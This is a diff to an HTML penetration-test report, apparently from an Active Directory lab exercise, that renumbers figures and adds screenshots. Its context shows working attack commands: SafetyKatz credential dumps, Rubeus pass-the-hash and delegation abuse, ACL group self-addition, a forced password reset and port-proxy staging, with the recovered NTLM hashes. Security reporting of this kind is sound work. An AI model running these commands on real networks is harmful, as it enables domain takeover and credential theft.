@@ -96,23 +96,76 @@
     <li><a href="#figure-2" class="ref ref-figure"><span class="ref-title">Cleartext studentadmin password inside the backup script</span></a></li>
     <li><a href="#figure-3" class="ref ref-figure"><span class="ref-title">runas as the recovered studentadmin account</span></a></li>
     <li><a href="#figure-4" class="ref ref-figure"><span class="ref-title">Defender real-time monitoring disabled</span></a></li>
-    <li><a href="#figure-5" class="ref ref-figure"><span class="ref-title">STUDVM$ machine-account NTLM hash recovered from LSASS</span></a></li>
-    <li><a href="#figure-6" class="ref ref-figure"><span class="ref-title">Forest trust to finance.corp discovered by adPEAS</span></a></li>
-    <li><a href="#figure-7" class="ref ref-figure"><span class="ref-title">BloodHound shortest path to Domain Admin</span></a></li>
-    <li><a href="#figure-8" class="ref ref-figure"><span class="ref-title">Configuring Resource-Based Constrained Delegation on MGMTSRV</span></a></li>
-    <li><a href="#figure-9" class="ref ref-figure"><span class="ref-title">OS command execution on MGMTSRV as techadmin</span></a></li>
-    <li><a href="#figure-10" class="ref ref-figure"><span class="ref-title">techservice credentials recovered from MGMTSRV</span></a></li>
-    <li><a href="#figure-11" class="ref ref-figure"><span class="ref-title">Management group holds Force-Change-Password over puretech</span></a></li>
-    <li><a href="#figure-12" class="ref ref-figure"><span class="ref-title">Self-adding techservice into the privileged Management group</span></a></li>
-    <li><a href="#figure-13" class="ref ref-figure"><span class="ref-title">Fresh techservice TGT requested after the group change</span></a></li>
-    <li><a href="#figure-14" class="ref ref-figure"><span class="ref-title">Force-resetting the puretech account password</span></a></li>
-    <li><a href="#figure-15" class="ref ref-figure"><span class="ref-title">Interactive session as puretech</span></a></li>
-    <li><a href="#figure-16" class="ref ref-figure"><span class="ref-title">SAM dump on TECHSRV30 exposing the local admin securetech</span></a></li>
-    <li><a href="#figure-17" class="ref ref-figure"><span class="ref-title">TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)</span></a></li>
-    <li><a href="#figure-18" class="ref ref-figure"><span class="ref-title">Requesting the FIDO enrollment-agent certificate as causer</span></a></li>
-    <li><a href="#figure-19" class="ref ref-figure"><span class="ref-title">Domain Admin TGT via PKINIT and OS command execution on TECH-DC</span></a></li>
-    <li><a href="#figure-20" class="ref ref-figure"><span class="ref-title">PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</span></a></li>
-    <li><a href="#figure-21" class="ref ref-figure"><span class="ref-title">Final objective flag read on FINANCE-DC as finadmin</span></a></li>
+    <li><a href="#figure-5" class="ref ref-figure"><span class="ref-title">Adding studentuser to the local Administrators group</span></a></li>
+    <li><a href="#figure-6" class="ref ref-figure"><span class="ref-title">STUDVM$ machine-account NTLM hash recovered from LSASS</span></a></li>
+    <li><a href="#figure-7" class="ref ref-figure"><span class="ref-title">studentuser NTLM hash also recovered from LSASS</span></a></li>
+    <li><a href="#figure-8" class="ref ref-figure"><span class="ref-title">Initial foothold on the STUDVM workstation</span></a></li>
+    <li><a href="#figure-9" class="ref ref-figure"><span class="ref-title">Domain identified from the foothold host</span></a></li>
+    <li><a href="#figure-10" class="ref ref-figure"><span class="ref-title">Running adPEAS for automated domain enumeration</span></a></li>
+    <li><a href="#figure-11" class="ref ref-figure"><span class="ref-title">Forest trust to finance.corp discovered by adPEAS</span></a></li>
+    <li><a href="#figure-12" class="ref ref-figure"><span class="ref-title">adPEAS: domain, domain controller and Kerberos policy overview</span></a></li>
+    <li><a href="#figure-13" class="ref ref-figure"><span class="ref-title">adPEAS: LDAP and SMB signing configuration from GPO</span></a></li>
+    <li><a href="#figure-14" class="ref ref-figure"><span class="ref-title">techadmin (RID 500) in Domain Admins and Enterprise Admins</span></a></li>
+    <li><a href="#figure-15" class="ref ref-figure"><span class="ref-title">Unprotected Tier-0: techadmin is not in the Protected Users group</span></a></li>
+    <li><a href="#figure-16" class="ref ref-figure"><span class="ref-title">ms-DS-MachineAccountQuota set to 10 (any user may join computers)</span></a></li>
+    <li><a href="#figure-17" class="ref ref-figure"><span class="ref-title">LAPS not deployed: all five computers unprotected</span></a></li>
+    <li><a href="#figure-18" class="ref ref-figure"><span class="ref-title">Domain controller computer object (trusted for delegation)</span></a></li>
+    <li><a href="#figure-19" class="ref ref-figure"><span class="ref-title">AD CS certificate authority and its published templates</span></a></li>
+    <li><a href="#figure-20" class="ref ref-figure"><span class="ref-title">FIDO template flagged ESC3 (Certificate Request Agent / Enrollment Agent)</span></a></li>
+    <li><a href="#figure-21" class="ref ref-figure"><span class="ref-title">FIDOUsers template also flagged ESC3</span></a></li>
+    <li><a href="#figure-22" class="ref ref-figure"><span class="ref-title">BloodHound shortest path to Domain Admin</span></a></li>
+    <li><a href="#figure-23" class="ref ref-figure"><span class="ref-title">Invoke-SessionHunter: privileged sessions on ADMINSRV86 and MGMTSRV</span></a></li>
+    <li><a href="#figure-24" class="ref ref-figure"><span class="ref-title">Find-PSRemotingLocalAdminAccess enumeration</span></a></li>
+    <li><a href="#figure-25" class="ref ref-figure"><span class="ref-title">Get-DomainComputer -Unconstrained: TECH-DC trusted for delegation</span></a></li>
+    <li><a href="#figure-26" class="ref ref-figure"><span class="ref-title">Over-Pass-the-Hash: a TGT is requested for the STUDVM$ machine account</span></a></li>
+    <li><a href="#figure-27" class="ref ref-figure"><span class="ref-title">Configuring Resource-Based Constrained Delegation on MGMTSRV</span></a></li>
+    <li><a href="#figure-28" class="ref ref-figure"><span class="ref-title">S4U2Self/S4U2Proxy forging a techadmin service ticket to MGMTSRV</span></a></li>
+    <li><a href="#figure-29" class="ref ref-figure"><span class="ref-title">OS command execution on MGMTSRV as techadmin</span></a></li>
+    <li><a href="#figure-30" class="ref ref-figure"><span class="ref-title">techservice credentials recovered from MGMTSRV</span></a></li>
+    <li><a href="#figure-31" class="ref ref-figure"><span class="ref-title">Full credential dump on MGMTSRV (1/2)</span></a></li>
+    <li><a href="#figure-32" class="ref ref-figure"><span class="ref-title">Full credential dump on MGMTSRV (2/2)</span></a></li>
+    <li><a href="#figure-33" class="ref ref-figure"><span class="ref-title">MGMTSRV$ machine-account hash also recovered</span></a></li>
+    <li><a href="#figure-34" class="ref ref-figure"><span class="ref-title">Management group holds Force-Change-Password over puretech</span></a></li>
+    <li><a href="#figure-35" class="ref ref-figure"><span class="ref-title">Domain groups: Management and srvusers stand out as custom groups</span></a></li>
+    <li><a href="#figure-36" class="ref ref-figure"><span class="ref-title">techservice ACLs, including Self-Membership on Management</span></a></li>
+    <li><a href="#figure-37" class="ref ref-figure"><span class="ref-title">techservice Self-Membership right over the Management group</span></a></li>
+    <li><a href="#figure-38" class="ref ref-figure"><span class="ref-title">Confirming Management holds User-Force-Change-Password over puretech</span></a></li>
+    <li><a href="#figure-39" class="ref ref-figure"><span class="ref-title">Self-adding techservice into the privileged Management group</span></a></li>
+    <li><a href="#figure-40" class="ref ref-figure"><span class="ref-title">Fresh techservice TGT requested after the group change</span></a></li>
+    <li><a href="#figure-41" class="ref ref-figure"><span class="ref-title">Requesting the techservice TGT in a new window</span></a></li>
+    <li><a href="#figure-42" class="ref ref-figure"><span class="ref-title">Operating inside the refreshed techservice session</span></a></li>
+    <li><a href="#figure-43" class="ref ref-figure"><span class="ref-title">Force-resetting the puretech account password</span></a></li>
+    <li><a href="#figure-44" class="ref ref-figure"><span class="ref-title">Interactive session as puretech</span></a></li>
+    <li><a href="#figure-45" class="ref ref-figure"><span class="ref-title">Requesting a puretech TGT in a sacrificial process</span></a></li>
+    <li><a href="#figure-46" class="ref ref-figure"><span class="ref-title">Confirmed access as puretech</span></a></li>
+    <li><a href="#figure-47" class="ref ref-figure"><span class="ref-title">OS command execution and full privileges as puretech on TECHSRV30</span></a></li>
+    <li><a href="#figure-48" class="ref ref-figure"><span class="ref-title">Staging the loader onto TECHSRV30 through the port-proxy</span></a></li>
+    <li><a href="#figure-49" class="ref ref-figure"><span class="ref-title">Port-proxy configured and SafetyKatz run through the loader</span></a></li>
+    <li><a href="#figure-50" class="ref ref-figure"><span class="ref-title">TECHSRV30$ machine-account hash recovered</span></a></li>
+    <li><a href="#figure-51" class="ref ref-figure"><span class="ref-title">SAM dump on TECHSRV30 exposing the local admin securetech</span></a></li>
+    <li><a href="#figure-52" class="ref ref-figure"><span class="ref-title">TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)</span></a></li>
+    <li><a href="#figure-53" class="ref ref-figure"><span class="ref-title">srvusers group and its Self-Membership ACE for TECHSRV30$</span></a></li>
+    <li><a href="#figure-54" class="ref ref-figure"><span class="ref-title">srvusers membership confirmed: TECHSRV30$</span></a></li>
+    <li><a href="#figure-55" class="ref ref-figure"><span class="ref-title">TECHSRV30$ ticket requested for the pivot to ADMINSRV86</span></a></li>
+    <li><a href="#figure-56" class="ref ref-figure"><span class="ref-title">causer password recovered from the SNMPTRAP LSA secret</span></a></li>
+    <li><a href="#figure-57" class="ref ref-figure"><span class="ref-title">ADMINSRV86$ machine account recovered</span></a></li>
+    <li><a href="#figure-58" class="ref ref-figure"><span class="ref-title">Credential dump on ADMINSRV86</span></a></li>
+    <li><a href="#figure-59" class="ref ref-figure"><span class="ref-title">Requesting the FIDO enrollment-agent certificate as causer</span></a></li>
+    <li><a href="#figure-60" class="ref ref-figure"><span class="ref-title">causer identified as a principal able to enrol in the FIDO (ESC3) template</span></a></li>
+    <li><a href="#figure-61" class="ref ref-figure"><span class="ref-title">Launching a logon session as causer (runas /netonly)</span></a></li>
+    <li><a href="#figure-62" class="ref ref-figure"><span class="ref-title">Converting the enrollment-agent certificate to PFX</span></a></li>
+    <li><a href="#figure-63" class="ref ref-figure"><span class="ref-title">On-behalf-of certificate issued for the Domain Admin techadmin</span></a></li>
+    <li><a href="#figure-64" class="ref ref-figure"><span class="ref-title">Converting the techadmin certificate to PFX</span></a></li>
+    <li><a href="#figure-65" class="ref ref-figure"><span class="ref-title">Domain Admin TGT via PKINIT and OS command execution on TECH-DC</span></a></li>
+    <li><a href="#figure-66" class="ref ref-figure"><span class="ref-title">Inter-realm trust keys extracted via DCSync</span></a></li>
+    <li><a href="#figure-67" class="ref ref-figure"><span class="ref-title">lsadump::evasive-trust /patch: In / Out inter-realm trust keys</span></a></li>
+    <li><a href="#figure-68" class="ref ref-figure"><span class="ref-title">DCSync of tech\krbtgt (hash used in the superseded attempt)</span></a></li>
+    <li><a href="#figure-69" class="ref ref-figure"><span class="ref-title">Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</span></a></li>
+    <li><a href="#figure-70" class="ref ref-figure"><span class="ref-title">CIFS service ticket obtained; TechOperations share lists finadmin.pem</span></a></li>
+    <li><a href="#figure-71" class="ref ref-figure"><span class="ref-title">Unencrypted finadmin.pem stolen from the cross-forest share and converted</span></a></li>
+    <li><a href="#figure-72" class="ref ref-figure"><span class="ref-title">PKINIT as finadmin: Domain Admin TGT issued for finance.corp</span></a></li>
+    <li><a href="#figure-73" class="ref ref-figure"><span class="ref-title">PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</span></a></li>
+    <li><a href="#figure-74" class="ref ref-figure"><span class="ref-title">Final objective flag read on FINANCE-DC as finadmin</span></a></li>
   </ul>
 </section>
 <pagebreak />
@@ -367,6 +420,7 @@ which becomes the key to the delegation attack in finding F-4.</p>
 net localgroup administrators TECH\studentuser /add
 </code></pre>
 <figure id="figure-4"><img alt="Defender real-time monitoring disabled" src="images/img18.png"><figcaption>Defender real-time monitoring disabled</figcaption></figure>
+<figure id="figure-5"><img alt="Adding studentuser to the local Administrators group" src="images/img19.png"><figcaption>Adding studentuser to the local Administrators group</figcaption></figure>
 <p>Dump credentials from LSASS with SafetyKatz launched through a loader:</p>
 <pre><code class="language-powershell">Loader.exe -path SafetyKatz.exe -args &quot;sekurlsa::evasive-logonpasswords&quot; &quot;exit&quot;
 </code></pre>
@@ -375,7 +429,8 @@ net localgroup administrators TECH\studentuser /add
 * Domain   : TECH
 * NTLM     : 354cc671b0e734b885308de998576b0b
 </code></pre>
-<figure id="figure-5" class="evidence"><img alt="STUDVM$ machine-account NTLM hash recovered from LSASS" class="evidence" src="images/img20.png"><figcaption>STUDVM$ machine-account NTLM hash recovered from LSASS</figcaption></figure>
+<figure id="figure-6" class="evidence"><img alt="STUDVM$ machine-account NTLM hash recovered from LSASS" class="evidence" src="images/img20.png"><figcaption>STUDVM$ machine-account NTLM hash recovered from LSASS</figcaption></figure>
+<figure id="figure-7"><img alt="studentuser NTLM hash also recovered from LSASS" src="images/img21.png"><figcaption>studentuser NTLM hash also recovered from LSASS</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Deploy <strong>LAPS</strong> and <strong>Windows Defender Credential Guard</strong> to protect LSASS
@@ -415,13 +470,20 @@ Protected Users membership. adPEAS also flagged an AD CS certificate
 authority publishing an ESC3-vulnerable template, and BloodHound confirmed a
 short path to Domain Admin.</p>
     <h3>Compromise Steps</h3>
+<p>From the STUDVM foothold the domain was identified and adPEAS was run for
+automated enumeration:</p>
+<figure id="figure-8"><img alt="Initial foothold on the STUDVM workstation" src="images/img00.png"><figcaption>Initial foothold on the STUDVM workstation</figcaption></figure>
+<figure id="figure-9"><img alt="Domain identified from the foothold host" src="images/img01.png"><figcaption>Domain identified from the foothold host</figcaption></figure>
+<figure id="figure-10"><img alt="Running adPEAS for automated domain enumeration" src="images/img02.png"><figcaption>Running adPEAS for automated domain enumeration</figcaption></figure>
 <p>adPEAS identifies the domain and the <strong>bidirectional, quarantined trust</strong>
 to <code>finance.corp</code>:</p>
 <pre><code class="language-text">domainNameDNS   : tech.corp
 domainSID       : S-1-5-21-1600556212-896947471-994435180
 trustPartner    : finance.corp   (Bidirectional, Transitive, QUARANTINED_DOMAIN)
 </code></pre>
-<figure id="figure-6"><img alt="Forest trust to finance.corp discovered by adPEAS" src="images/img04.png"><figcaption>Forest trust to finance.corp discovered by adPEAS</figcaption></figure>
+<figure id="figure-11"><img alt="Forest trust to finance.corp discovered by adPEAS" src="images/img04.png"><figcaption>Forest trust to finance.corp discovered by adPEAS</figcaption></figure>
+<figure id="figure-12" class="evidence"><img alt="adPEAS: domain, domain controller and Kerberos policy overview" class="evidence" src="images/img03.png"><figcaption>adPEAS: domain, domain controller and Kerberos policy overview</figcaption></figure>
+<figure id="figure-13" class="evidence"><img alt="adPEAS: LDAP and SMB signing configuration from GPO" class="evidence" src="images/img05.png"><figcaption>adPEAS: LDAP and SMB signing configuration from GPO</figcaption></figure>
 <p>Privileged-account enumeration shows <code>techadmin</code> is the RID 500 account and
 sits in every Tier-0 group:</p>
 <pre><code class="language-text">sAMAccountName : techadmin
@@ -429,8 +491,15 @@ objectSid      : S-1-5-21-1600556212-896947471-994435180-500
 privilegedGroups : Domain Admins, Enterprise Admins, Schema Admins, Administrators
 description    : Built-in account for administering the computer/domain
 </code></pre>
-<p><img alt="techadmin (RID 500) in Domain Admins and Enterprise Admins" class="evidence" src="images/img10.png">
-Key weaknesses surfaced during enumeration:</p>
+<figure id="figure-14" class="evidence"><img alt="techadmin (RID 500) in Domain Admins and Enterprise Admins" class="evidence" src="images/img10.png"><figcaption>techadmin (RID 500) in Domain Admins and Enterprise Admins</figcaption></figure>
+<figure id="figure-15"><img alt="Unprotected Tier-0: techadmin is not in the Protected Users group" src="images/img11.png"><figcaption>Unprotected Tier-0: techadmin is not in the Protected Users group</figcaption></figure>
+<figure id="figure-16"><img alt="ms-DS-MachineAccountQuota set to 10 (any user may join computers)" src="images/img06.png"><figcaption>ms-DS-MachineAccountQuota set to 10 (any user may join computers)</figcaption></figure>
+<figure id="figure-17"><img alt="LAPS not deployed: all five computers unprotected" src="images/img13.png"><figcaption>LAPS not deployed: all five computers unprotected</figcaption></figure>
+<figure id="figure-18"><img alt="Domain controller computer object (trusted for delegation)" src="images/img12.png"><figcaption>Domain controller computer object (trusted for delegation)</figcaption></figure>
+<figure id="figure-19" class="evidence"><img alt="AD CS certificate authority and its published templates" class="evidence" src="images/img07.png"><figcaption>AD CS certificate authority and its published templates</figcaption></figure>
+<figure id="figure-20" class="evidence"><img alt="FIDO template flagged ESC3 (Certificate Request Agent / Enrollment Agent)" class="evidence" src="images/img08.png"><figcaption>FIDO template flagged ESC3 (Certificate Request Agent / Enrollment Agent)</figcaption></figure>
+<figure id="figure-21" class="evidence"><img alt="FIDOUsers template also flagged ESC3" class="evidence" src="images/img09.png"><figcaption>FIDOUsers template also flagged ESC3</figcaption></figure>
+<p>Key weaknesses surfaced during enumeration:</p>
 <table>
 <thead>
 <tr>
@@ -464,7 +533,10 @@ Key weaknesses surfaced during enumeration:</p>
 Get-DomainComputer -Unconstrained | select name, useraccountcontrol
 # tech-dc  SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 </code></pre>
-<figure id="figure-7" class="evidence"><img alt="BloodHound shortest path to Domain Admin" class="evidence" src="images/img14.png"><figcaption>BloodHound shortest path to Domain Admin</figcaption></figure>
+<figure id="figure-22" class="evidence"><img alt="BloodHound shortest path to Domain Admin" class="evidence" src="images/img14.png"><figcaption>BloodHound shortest path to Domain Admin</figcaption></figure>
+<figure id="figure-23"><img alt="Invoke-SessionHunter: privileged sessions on ADMINSRV86 and MGMTSRV" src="images/img22.png"><figcaption>Invoke-SessionHunter: privileged sessions on ADMINSRV86 and MGMTSRV</figcaption></figure>
+<figure id="figure-24"><img alt="Find-PSRemotingLocalAdminAccess enumeration" src="images/img23.png"><figcaption>Find-PSRemotingLocalAdminAccess enumeration</figcaption></figure>
+<figure id="figure-25"><img alt="Get-DomainComputer -Unconstrained: TECH-DC trusted for delegation" src="images/img24.png"><figcaption>Get-DomainComputer -Unconstrained: TECH-DC trusted for delegation</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Lower <code>ms-DS-MachineAccountQuota</code> to <strong>0</strong> so standard users cannot create
@@ -504,30 +576,34 @@ next stage.</p>
 <pre><code class="language-powershell">Rubeus.exe asktgt /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
   /domain:tech.corp /dc:tech-dc.tech.corp /ptt
 </code></pre>
+<figure id="figure-26"><img alt="Over-Pass-the-Hash: a TGT is requested for the STUDVM$ machine account" src="images/img25.png"><figcaption>Over-Pass-the-Hash: a TGT is requested for the STUDVM$ machine account</figcaption></figure>
 <p>Configure RBCD so MGMTSRV trusts <code>STUDVM$</code> to act on behalf of others:</p>
 <pre><code class="language-powershell">Set-DomainRBCD -Identity MGMTSRV -DelegateFrom &quot;STUDVM$&quot;
 </code></pre>
-<figure id="figure-8"><img alt="Configuring Resource-Based Constrained Delegation on MGMTSRV" src="images/img26.png"><figcaption>Configuring Resource-Based Constrained Delegation on MGMTSRV</figcaption></figure>
+<figure id="figure-27"><img alt="Configuring Resource-Based Constrained Delegation on MGMTSRV" src="images/img26.png"><figcaption>Configuring Resource-Based Constrained Delegation on MGMTSRV</figcaption></figure>
 <p>Use S4U2Self and S4U2Proxy to impersonate the Domain Admin <code>techadmin</code>:</p>
 <pre><code class="language-powershell">Rubeus.exe s4u /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
   /impersonateuser:techadmin /msdsspn:http/mgmtsrv.tech.corp `
   /altservice:host,wsman,cifs,rpcss /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
 </code></pre>
-<p><img alt="S4U2Self/S4U2Proxy forging a techadmin service ticket to MGMTSRV" class="evidence" src="images/img27.png">
-With the ticket injected, operating-system-level command execution on
+<figure id="figure-28" class="evidence"><img alt="S4U2Self/S4U2Proxy forging a techadmin service ticket to MGMTSRV" class="evidence" src="images/img27.png"><figcaption>S4U2Self/S4U2Proxy forging a techadmin service ticket to MGMTSRV</figcaption></figure>
+<p>With the ticket injected, operating-system-level command execution on
 MGMTSRV as <code>techadmin</code> is confirmed:</p>
 <pre><code class="language-text">winrs -r:mgmtsrv.tech.corp cmd
 Microsoft Windows [Version 10.0.20348.4052]
 C:\Users\techadmin&gt;
 </code></pre>
-<figure id="figure-9"><img alt="OS command execution on MGMTSRV as techadmin" src="images/img28.png"><figcaption>OS command execution on MGMTSRV as techadmin</figcaption></figure>
+<figure id="figure-29"><img alt="OS command execution on MGMTSRV as techadmin" src="images/img28.png"><figcaption>OS command execution on MGMTSRV as techadmin</figcaption></figure>
 <p>The host's credentials are then dumped, revealing the <code>techservice</code> service
 account used in F-5:</p>
 <pre><code class="language-text">* Username : techservice
 * Domain   : TECH
 * NTLM     : 4311a88033b35fbbd00a681b005b6ead
 </code></pre>
-<figure id="figure-10"><img alt="techservice credentials recovered from MGMTSRV" src="images/img31.png"><figcaption>techservice credentials recovered from MGMTSRV</figcaption></figure>
+<figure id="figure-30"><img alt="techservice credentials recovered from MGMTSRV" src="images/img31.png"><figcaption>techservice credentials recovered from MGMTSRV</figcaption></figure>
+<figure id="figure-31" class="evidence"><img alt="Full credential dump on MGMTSRV (1/2)" class="evidence" src="images/img29.png"><figcaption>Full credential dump on MGMTSRV (1/2)</figcaption></figure>
+<figure id="figure-32" class="evidence"><img alt="Full credential dump on MGMTSRV (2/2)" class="evidence" src="images/img30.png"><figcaption>Full credential dump on MGMTSRV (2/2)</figcaption></figure>
+<figure id="figure-33"><img alt="MGMTSRV$ machine-account hash also recovered" src="images/img32.png"><figcaption>MGMTSRV$ machine-account hash also recovered</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Audit and remove write access to <strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></strong>
@@ -567,27 +643,35 @@ value, a pure permissions abuse that requires no cracking.</p>
 <pre><code class="language-powershell"># techservice -&gt; Management (Self-Membership)
 # Management  -&gt; puretech    (User-Force-Change-Password)
 </code></pre>
-<figure id="figure-11"><img alt="Management group holds Force-Change-Password over puretech" src="images/img35.png"><figcaption>Management group holds Force-Change-Password over puretech</figcaption></figure>
+<figure id="figure-34"><img alt="Management group holds Force-Change-Password over puretech" src="images/img35.png"><figcaption>Management group holds Force-Change-Password over puretech</figcaption></figure>
+<figure id="figure-35"><img alt="Domain groups: Management and srvusers stand out as custom groups" src="images/img33.png"><figcaption>Domain groups: Management and srvusers stand out as custom groups</figcaption></figure>
+<figure id="figure-36" class="evidence"><img alt="techservice ACLs, including Self-Membership on Management" class="evidence" src="images/img34.png"><figcaption>techservice ACLs, including Self-Membership on Management</figcaption></figure>
+<figure id="figure-37"><img alt="techservice Self-Membership right over the Management group" src="images/img36.png"><figcaption>techservice Self-Membership right over the Management group</figcaption></figure>
+<figure id="figure-38" class="evidence"><img alt="Confirming Management holds User-Force-Change-Password over puretech" class="evidence" src="images/img40.png"><figcaption>Confirming Management holds User-Force-Change-Password over puretech</figcaption></figure>
 <p>Add <code>techservice</code> into the <code>Management</code> group:</p>
 <pre><code class="language-powershell">Add-DomainGroupMember -Identity &quot;Management&quot; -Members &quot;techservice&quot; -Domain tech.corp -Verbose
 # VERBOSE: [Add-DomainGroupMember] Adding member 'techservice' to group 'Management'
 </code></pre>
-<figure id="figure-12"><img alt="Self-adding techservice into the privileged Management group" src="images/img39.png"><figcaption>Self-adding techservice into the privileged Management group</figcaption></figure>
+<figure id="figure-39"><img alt="Self-adding techservice into the privileged Management group" src="images/img39.png"><figcaption>Self-adding techservice into the privileged Management group</figcaption></figure>
 <p>The new group membership only takes effect in a <strong>fresh ticket</strong>, so request
 a new TGT for <code>techservice</code> in a sacrificial logon session before using the
 group's rights:</p>
 <pre><code class="language-powershell">Rubeus.exe asktgt /user:techservice /rc4:4311a88033b35fbbd00a681b005b6ead `
   /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 </code></pre>
-<figure id="figure-13"><img alt="Fresh techservice TGT requested after the group change" src="images/img41.png"><figcaption>Fresh techservice TGT requested after the group change</figcaption></figure>
+<figure id="figure-40"><img alt="Fresh techservice TGT requested after the group change" src="images/img41.png"><figcaption>Fresh techservice TGT requested after the group change</figcaption></figure>
+<figure id="figure-41"><img alt="Requesting the techservice TGT in a new window" src="images/img37.png"><figcaption>Requesting the techservice TGT in a new window</figcaption></figure>
+<figure id="figure-42"><img alt="Operating inside the refreshed techservice session" src="images/img38.png"><figcaption>Operating inside the refreshed techservice session</figcaption></figure>
 <p>With the refreshed context, force-reset the <code>puretech</code> password:</p>
 <pre><code class="language-powershell">Set-DomainUserPassword -Identity puretech -AccountPassword $pass -Verbose
 # VERBOSE: [Set-DomainUserPassword] Password for user 'puretech' successfully reset
 </code></pre>
-<figure id="figure-14"><img alt="Force-resetting the puretech account password" src="images/img42.png"><figcaption>Force-resetting the puretech account password</figcaption></figure>
+<figure id="figure-43"><img alt="Force-resetting the puretech account password" src="images/img42.png"><figcaption>Force-resetting the puretech account password</figcaption></figure>
 <p>A logon as <code>puretech</code> is then obtained, giving a fresh identity to pivot
 with:</p>
-<figure id="figure-15"><img alt="Interactive session as puretech" src="images/img44.png"><figcaption>Interactive session as puretech</figcaption></figure>
+<figure id="figure-44"><img alt="Interactive session as puretech" src="images/img44.png"><figcaption>Interactive session as puretech</figcaption></figure>
+<figure id="figure-45"><img alt="Requesting a puretech TGT in a sacrificial process" src="images/img43.png"><figcaption>Requesting a puretech TGT in a sacrificial process</figcaption></figure>
+<figure id="figure-46"><img alt="Confirmed access as puretech" src="images/img45.png"><figcaption>Confirmed access as puretech</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Remove the <strong>Self-Membership</strong> ACE that lets <code>techservice</code> add itself to
@@ -631,18 +715,21 @@ C:\Users\puretech&gt; whoami /priv
 # SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,
 # SeTakeOwnershipPrivilege, SeImpersonatePrivilege ... all Enabled
 </code></pre>
-<p><img alt="OS command execution and full privileges as puretech on TECHSRV30" class="evidence" src="images/img46.png">
-TECHSRV30 could not reach the operator tooling directly, so a <strong>port-proxy</strong>
+<figure id="figure-47" class="evidence"><img alt="OS command execution and full privileges as puretech on TECHSRV30" class="evidence" src="images/img46.png"><figcaption>OS command execution and full privileges as puretech on TECHSRV30</figcaption></figure>
+<p>TECHSRV30 could not reach the operator tooling directly, so a <strong>port-proxy</strong>
 was configured on the host to relay traffic back through the STUDVM
 foothold, from which the loader and SafetyKatz were staged:</p>
 <pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
   connectport=80 connectaddress=&lt;STUDVM foothold&gt;
 </code></pre>
+<figure id="figure-48"><img alt="Staging the loader onto TECHSRV30 through the port-proxy" src="images/img47.png"><figcaption>Staging the loader onto TECHSRV30 through the port-proxy</figcaption></figure>
+<figure id="figure-49"><img alt="Port-proxy configured and SafetyKatz run through the loader" src="images/img48.png"><figcaption>Port-proxy configured and SafetyKatz run through the loader</figcaption></figure>
 <p>The machine account is recovered from LSASS:</p>
 <pre><code class="language-text">* Username : techsrv30$
 * Domain   : TECH
 * NTLM     : 04b37fd7d28ab7c9b3cbe36336d19581
 </code></pre>
+<figure id="figure-50"><img alt="TECHSRV30$ machine-account hash recovered" src="images/img49.png"><figcaption>TECHSRV30$ machine-account hash recovered</figcaption></figure>
 <p>Elevate to SYSTEM and dump the SAM to recover the local administrator
 <code>securetech</code> (RID 500):</p>
 <pre><code class="language-text">C:\Temp\sk.exe &quot;token::elevate&quot; &quot;lsadump::evasive-sam&quot; &quot;exit&quot;
@@ -651,7 +738,7 @@ RID  : 000001f4 (500)
 User : securetech
 Hash NTLM: abbd00c18b8ff34770238a08e98f4932
 </code></pre>
-<figure id="figure-16" class="evidence"><img alt="SAM dump on TECHSRV30 exposing the local admin securetech" class="evidence" src="images/img51.png"><figcaption>SAM dump on TECHSRV30 exposing the local admin securetech</figcaption></figure>
+<figure id="figure-51" class="evidence"><img alt="SAM dump on TECHSRV30 exposing the local admin securetech" class="evidence" src="images/img51.png"><figcaption>SAM dump on TECHSRV30 exposing the local admin securetech</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Deploy <strong>LAPS</strong> to eliminate shared local-administrator passwords across
@@ -695,24 +782,28 @@ certificate-enrollment rights abused in F-8.</p>
 Get-DomainGroupMember -Identity &quot;srvusers&quot;
 # MemberName : TECHSRV30$   (S-1-5-21-1600556212-896947471-994435180-1104)
 </code></pre>
-<figure id="figure-17"><img alt="TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)" src="images/img53.png"><figcaption>TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)</figcaption></figure>
+<figure id="figure-52"><img alt="TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)" src="images/img53.png"><figcaption>TECHSRV30$ self-added to the srvusers group (local admin on ADMINSRV86)</figcaption></figure>
+<figure id="figure-53" class="evidence"><img alt="srvusers group and its Self-Membership ACE for TECHSRV30$" class="evidence" src="images/img52.png"><figcaption>srvusers group and its Self-Membership ACE for TECHSRV30$</figcaption></figure>
+<figure id="figure-54"><img alt="srvusers membership confirmed: TECHSRV30$" src="images/img54.png"><figcaption>srvusers membership confirmed: TECHSRV30$</figcaption></figure>
 <p>Request a <code>TECHSRV30$</code> TGT in a sacrificial logon session, giving admin
 access to ADMINSRV86 through the <code>srvusers</code> membership:</p>
 <pre><code class="language-powershell">Rubeus.exe asktgt /user:techsrv30$ /rc4:04b37fd7d28ab7c9b3cbe36336d19581 `
   /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 </code></pre>
-<p><img alt="TECHSRV30$ ticket requested for the pivot to ADMINSRV86" class="evidence" src="images/img55.png">
-On ADMINSRV86, dump LSA secrets and recover the <code>causer</code> service password in
+<figure id="figure-55" class="evidence"><img alt="TECHSRV30$ ticket requested for the pivot to ADMINSRV86" class="evidence" src="images/img55.png"><figcaption>TECHSRV30$ ticket requested for the pivot to ADMINSRV86</figcaption></figure>
